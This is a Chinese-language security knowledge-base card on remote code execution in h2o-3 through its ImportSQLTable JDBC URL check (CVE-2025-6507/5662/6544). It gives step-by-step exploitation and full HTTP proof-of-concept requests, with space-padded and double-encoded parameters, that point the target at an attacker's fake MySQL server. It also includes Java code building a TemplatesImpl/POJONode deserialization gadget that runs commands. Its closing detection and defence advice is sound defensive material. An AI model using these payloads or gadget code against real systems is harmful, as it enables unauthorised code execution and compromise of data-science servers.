---
id: web-java-component-h2o3-importsqltable-jdbc-url-validation-bypass-rce
title: h2o-3 <= V3.46.0.8 ImportSQLTable JDBC URL 校验绕过：参数空格/二次 URL 编码 + 恶意 MySQL 服务端 autoDeserialize RCE（CVE-2025-6507/5662/6544）
type: scenario
domain: web
path: web/java/component
technique: h2o3-importsqltable-jdbc-url-validation-bypass-autodeserialize
tags:
- java
- h2o
- h2o-3
- jdbc
- mysql
- deserialization
- autodeserialize
- filter-bypass
- url-encoding
- rce
- jackson
cve:
- CVE-2025-6507
- CVE-2025-5662
- CVE-2025-6544
severity: critical
confidence: high
status: verified
affected_versions: <= V3.46.0.8
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V213
  verified_at: '2026-11-07T04:29:24+08:00'
  notes: 已对照原文与 img/02-13（img/01 缺失）核对：影响版本 <= V3.46.0.8、CVE-2025-6507/5662 空格绕过与修复正则、CVE-2025-6544 二次编码与循环解码修复、/99/ImportSQLTable 调用链、FakeServer 8.0.7-8.0.20 ServerStatusDiffInterceptor、POJONode/TemplatesImpl gadget、两次 200 响应回显 h2o 3.46.0.7 均一致；已按原文补设 affected_versions <= V3.46.0.8；保留。
url: /docs/web/java/component/web-java-component-h2o3-importsqltable-jdbc-url-validation-bypass-rce/
draft: false
kb_aliases:
- h2o-3 JDBC 反序列化
- H2O ImportSQLTable RCE
- CVE-2025-6507
- CVE-2025-5662
- CVE-2025-6544
- validateJdbcUrl 绕过
- JDBC 参数前空格绕过
- 二次 URL 编码绕过 JDBC 过滤
---

## 一句话结论

h2o-3 的 `/99/ImportSQLTable` 接口把用户提交的 `connection_url` 交给 `DriverManager.getConnection`；其 `validateJdbcUrl` 用正则 `(?i)[?;&]([a-z]+)=` 检查 MySQL 危险参数，但该正则匹配不到参数名前带空格的写法（`?  autoDeserialize=true& queryInterceptors=...`），二次 URL 编码（`%2561...`）也能绕过；攻击者把连接串指向恶意 MySQL 服务端并开启 `autoDeserialize=true` + `ServerStatusDiffInterceptor`，即可让驱动反序列化服务端返回的 Jackson `POJONode`/`TemplatesImpl` 链执行命令（CVE-2025-6507/5662/6544，影响 h2o-3 <= V3.46.0.8）。

## 原理

- **入口与调用链**：`water.api.RegisterV3Api#registerEndPoints` 把 `POST /99/ImportSQLTable` 注册到 `ImportSQLTableHandler#importSQLTable`；Handler 把表单字段传给 `water.jdbc.SQLManager#importSqlTable`，后者先调用 `validateJdbcUrl(connection_url)`，再进入 `getConnectionSafe`，最终执行 `DriverManager.getConnection(url, username, password)`。
- **校验逻辑**：`validateJdbcUrl` 先检查 URL 非空、`toLowerCase().startsWith("jdbc:")`，然后用 `JDBC_PARAMETERS_REGEX_PATTERN` 逐项匹配 `?`/`&`/`;` 后的参数名，与黑名单 `autoDeserialize`、`queryInterceptors`、`allowLoadLocalInfile`、`allowMultiQueries` 比较；命中即抛异常。
- **空格绕过（CVE-2025-6507/5662）**：漏洞版正则为 `(?i)[?;&]([a-z]+)=`，要求参数名紧跟分隔符、`=` 紧跟参数名。表单解码后把参数名写成 `?  autoDeserialize=true& queryInterceptors=...`（请求中对应 `++` 和 `+`），正则无法匹配到这两个危险参数，但 MySQL 驱动仍能解析这些带空格的属性；于是危险参数直达驱动。
- **二次编码绕过（CVE-2025-6544）**：校验只按“解码一次”后的字符串匹配；把参数名二次编码（`%2561%2575%2574%256f...`，解码一次得到 `%61%75%74%6f...`）后，正则看不到 `autoDeserialize`/`queryInterceptors`，而驱动在后续解析中再解码一次，危险参数仍然生效。修复提交为此增加了循环解码：最多 `URLDecoder.decode` 10 次，直到前后结果相同；若 10 次后仍在变化则判定非法，再用稳定后的 URL 做前缀与参数校验。
- **反序列化 sink**：MySQL Connector/J 的 `autoDeserialize=true` 允许反序列化服务端返回的特定列；8.x 配合 `queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor` 会在连接初始化时执行 `SHOW SESSION STATUS` 并反序列化返回的 value。恶意 MySQL 服务端即可返回任意序列化字节。
- **Gadget**：h2o-3 依赖 Jackson，可用 `POJONode` 包裹 `TemplatesImpl`，再放入 `BadAttributeValueExpException.val`。反序列化 `BadAttributeValueExpException` 时触发 `POJONode.toString()` → Jackson 序列化 `TemplatesImpl` → `getOutputProperties()` → 加载 `_bytecodes` 中的 `AbstractTranslet` 子类，静态初始化块执行命令。生成端常用 javassist 构造 `TemplatesImpl` 的 `_bytecodes`，并移除 `BaseJsonNode.writeReplace`，避免 Jackson 在序列化时把 `POJONode` 替换掉。
- **为什么整链成立**：h2o-3 的业务功能允许用户指定任意 JDBC URL，自带 MySQL 驱动与 Jackson gadget；应用层只做了一次朴素正则黑名单，而 JDBC 驱动对空白和二次编码的解析语义与校验层不一致。

## 触发条件

- 目标为 h2o-3 <= V3.46.0.8（原文标注），且 `/99/ImportSQLTable` 可访问（H2O Flow 默认无认证或攻击者已获得访问权限）。
- 目标能出网访问攻击者控制的 MySQL 服务端（示例 3309 端口）。
- 使用 MySQL Connector/J 8.0.7–8.0.20 的 `ServerStatusDiffInterceptor` 链；6.x 可换 `detectCustomCollations` 链（见关联卡片）。
- 目标 classpath 存在可用 gadget：h2o-3 自带 Jackson；`TemplatesImpl` 可用性取决于 JDK 版本与模块限制。
- 连接串满足 `jdbc:` 前缀；通过参数前空格或二次编码绕过黑名单。

## 利用步骤

1. 启动恶意 MySQL 服务端（如 MySQL-Fake-Server），监听 3309；JDBC 版本选 8.0.7–8.0.20，类型选 `ServerStatusDiffInterceptor`，加载自定义 base64 gadget；`user` 可用 `base64("deser_CUSTOM")` 让服务端选择自定义链。
2. 生成 gadget：javassist 生成继承 `AbstractTranslet` 的类，在静态初始化块中执行命令（示例 `open -a calculator`，Windows 换成 `cmd /c calc` 等），填入 `TemplatesImpl._bytecodes`；用 `POJONode` 包裹后放入 `BadAttributeValueExpException.val`，Java 序列化并 Base64。
3. 把 Base64 gadget 填入假服务端的 custom gadget 数据，启动服务端。
4. 发送 `POST /99/ImportSQLTable`：`connection_url` 指向假服务端，参数名前加空格（`?  autoDeserialize=true& queryInterceptors=...`），并带 `table`、`username`、`password`、`fetch_mode` 等字段。
5. 若目标已打第一次补丁（只修空格），把参数名二次编码（`%2561...`）再发一次。
6. 观察响应 200 / job 创建，服务端执行命令（原文为弹出 macOS 计算器）。

## PoC

恶意 JDBC URL（表单 `connection_url` 的值，解码后）：

```text
jdbc:mysql://<attacker>:3309/test?  autoDeserialize=true& queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

请求示例：

```http
POST /99/ImportSQLTable HTTP/1.1
Host: <h2o-target>:54321
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

connection_url=jdbc%3Amysql%3A%2F%2F<attacker>%3A3309%2Ftest%3F++autoDeserialize%3Dtrue%26+queryInterceptors%3Dcom.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&table=a&username=base64ZGVzZXJfQ1VTVE9N&password=123123&fetch_mode=SINGLE
```

二次编码绕过（CVE-2025-6544，参数名被编码两次）：

```http
connection_url=jdbc%3Amysql%3A%2F%2F<attacker>%3A3309%2Ftest%3F+%2561%2575%2574%256f%2544%2565%2573%2565%2572%2569%2561%256c%2569%257a%2565%3Dtrue%26+%2571%2575%2565%2572%2579%2549%256e%2574%2565%2572%2563%2565%2570%2574%256f%2572%2573%3Dcom.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&table=a&username=base64ZGVzZXJfQ1VTVE9N&password=123123&fetch_mode=SINGLE
```

Jackson `POJONode` gadget 关键结构（按原文整理，省略异常处理与完整字节码）：

```java
// 1) 用 javassist 生成恶意 AbstractTranslet 子类
CtClass template = ClassPool.getDefault().makeClass("templates");
template.setSuperclass(ClassPool.getDefault()
        .get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
template.makeClassInitializer().insertBefore(
        "Runtime.getRuntime().exec(\"open -a calculator\");");
byte[] code = template.toBytecode();

// 2) 构造 TemplatesImpl
TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates, "_name", "aaa");
setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
setFieldValue(templates, "_bytecodes", new byte[][] { code });

// 3) POJONode + BadAttributeValueExpException 包一层
POJONode node = new POJONode(templates);
BadAttributeValueExpException val = new BadAttributeValueExpException(null);
setFieldValue(val, "val", node);
// 4) Java 序列化 val，Base64 后填入假 MySQL 服务端
```

## 变体与关联

- 变体：6.x MySQL Connector/J 用 `detectCustomCollations=true&autoDeserialize=true` 触发；其他版本按驱动调整属性名。
- 变体：`validateJdbcUrl` 只黑名单 MySQL 参数，若 h2o-3 环境使用其他 JDBC 驱动，可尝试该驱动自身的危险属性；连接串前缀只要 `jdbc:` 即可。
- 变体：参数名前空格可换成制表符/其他驱动可忽略的空白；二次编码可叠加更多层，直到修复版引入循环解码。
- 关联卡片：[[web-java-deserialization-mysql-jdbc-url-autodeserialize-rce]]（MySQL JDBC autoDeserialize 通用链）、[[web-java-deserialization-jdbc-url-waf-parser-bypass]]（校验层与驱动解析差异的通用绕过）、[[web-java-deserialization-blacklist-hotswappable-xstring-pojonode-spring-aop]]（POJONode/TemplatesImpl gadget）、[[web-java-component-h2-jdbc-url-filter-bypass-runscript]]（同类产品 JDBC URL 过滤绕过）。

## 检测与防御

- **检测**：`POST /99/ImportSQLTable` 的 `connection_url` 出现 `autoDeserialize`、`queryInterceptors`、`allowLoadLocalInfile`、`allowMultiQueries`，或出现 `%25` 二次编码、参数名前空白、外部数据库地址；h2o 进程向外部 3306/3309 发起 MySQL 连接；出现 `Import SQL Table` 类型的 job。
- **检测**：监控响应中的 `X-h2o-build-project-version` 与异常 job；结合服务端出站连接日志定位恶意 MySQL 服务端。
- **防御**：升级到修复版本（含正则修复与循环 URL 解码）；限制 `/99/ImportSQLTable` 的访问来源或加认证/权限控制；对 JDBC URL 做规范化后使用主机白名单，而不是仅靠参数黑名单；禁止或限制 h2o 向不可信地址发起数据库连接；以低权限运行 h2o 并禁用不必要的 JDBC 驱动；WAF 作为补充而非唯一防线。
- **边界**：原文在 macOS 测试环境用 `open -a calculator` 验证；不同 JDK 版本对 `TemplatesImpl`/`POJONode` 链的限制不同，需结合实际 classpath 判断。
